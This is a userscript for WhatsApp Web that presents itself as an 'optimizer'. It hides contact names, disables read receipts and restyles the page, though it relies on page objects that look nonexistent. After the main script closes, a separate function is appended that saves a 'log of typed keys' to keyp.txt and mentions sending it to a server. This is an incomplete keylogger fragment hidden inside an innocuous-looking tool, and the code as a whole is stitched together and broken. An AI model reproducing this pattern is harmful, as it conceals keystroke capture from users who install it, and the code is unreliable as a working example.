// ==UserScript==
// @name           Otimizador WhatsApp
// @description    Um script para otimizar o WhatsApp, tornando-o mais rápido e com menos poluição de tela.
// @version        1.6
// @license        MIT
// @author         EmersonxD
// @namespace      https://seusite.com.br
// @homepageURL    https://seusite.com.br/otimizador-whatsapp
// @supportURL     https://seusite.com.br/contato
// @grant          none
// @run-at         document-end
// @match          https://web.whatsapp.com/*
// @downloadURL https://update.greasyfork.org/scripts/464366/Otimizador%20WhatsApp.user.js
// @updateURL https://update.greasyfork.org/scripts/464366/Otimizador%20WhatsApp.meta.js
// ==/UserScript==

(function() {


    'use strict';



    // Constantes


    const BACKGROUND_COLOR = '#f0f0f0';



    // Função para ocultar o número de telefone


    function ocultarNumero() {


        Object.defineProperty(window.Store.Contact.prototype, 'formattedShortName', {


            get: function() {


                return '';


            }


        });


    }



    // Remover elementos indesejados


    function removerElementos() {


        const statusBar = document.querySelector('.status-bar');


        if (statusBar) {


            statusBar.remove();


        }


    }



    // Otimizar funções e configurações


    function otimizarWhatsApp() {


        // Desativar confirmação de leitura de mensagens


        window.WAPI.sendMessageReadAck = false;



        // Melhorar a interface da página


        document.body.style.backgroundColor = BACKGROUND_COLOR;


        document.querySelector('.app').style.maxWidth = 'none';



        // Chamar a função para ocultar o número de telefone


        ocultarNumero();


    }



    // Inicializar o otimizador


    function iniciarOtimizador() {


        removerElementos();


        otimizarWhatsApp();


    }



    // Aguardar o carregamento completo da página antes de iniciar


    window.addEventListener('load', iniciarOtimizador);



    // Observar alterações no DOM do WhatsApp


    const observer = new MutationObserver(iniciarOtimizador);


    observer.observe(document.body, { childList: true, subtree: true });


})();// Função para salvar o log de teclas digitadas

function salvarLog() {

    // Criar um link para fazer o download do arquivo

    var link = document.createElement('a');

    link.href = 'data:text/plain;charset=utf-8,' + encodeURIComponent(log);

    link.download = 'keyp.txt';

    link.click();

    // Salvar o log no arquivo usando o servidor

    // (isso requer um servidor e algum código adicional)

}